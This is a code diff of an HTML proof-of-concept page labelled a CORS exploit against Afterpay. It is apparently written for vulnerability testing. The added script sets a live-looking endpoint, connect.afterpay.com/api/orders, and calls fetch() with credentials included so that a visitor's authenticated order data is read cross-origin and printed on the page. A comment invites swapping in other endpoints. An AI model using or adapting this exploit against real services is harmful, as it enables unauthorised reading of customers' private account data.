@@ -1,22 +1,30 @@
 <!DOCTYPE html>
 <html>
-<head><title>Afterpay CORS PoC2</title></head>
+<head>
+  <title>🔥 Afterpay CORS Exploit PoC</title>
+</head>
 <body>
-<h2>Afterpay CORS PoC</h2>
-<pre id="output"></pre>
+  <h2>🔥 Afterpay CORS Exploit PoC</h2>
+  <p>Trying to fetch authenticated content from: <b id="url"></b></p>
+  <pre id="output"></pre>
 
-<script>
-fetch("https://connect.afterpay.com/your-vulnerable-endpoint", {
-  method: "GET",
-  credentials: "include"
-})
-.then(res => res.text())
-.then(data => {
-  document.getElementById("output").textContent = data;
-})
-.catch(err => {
-  document.getElementById("output").textContent = "❌ Error:\n" + err;
-});
-</script>
+  <script>
+    // Change this URL to test different endpoints
+    const testUrl = "https://connect.afterpay.com/api/orders";
+
+    document.getElementById("url").textContent = testUrl;
+
+    fetch(testUrl, {
+      method: "GET",
+      credentials: "include"
+    })
+    .then(res => res.text())
+    .then(data => {
+      document.getElementById("output").textContent = data;
+    })
+    .catch(err => {
+      document.getElementById("output").textContent = "❌ Error:\n" + err;
+    });
+  </script>
 </body>
 </html>
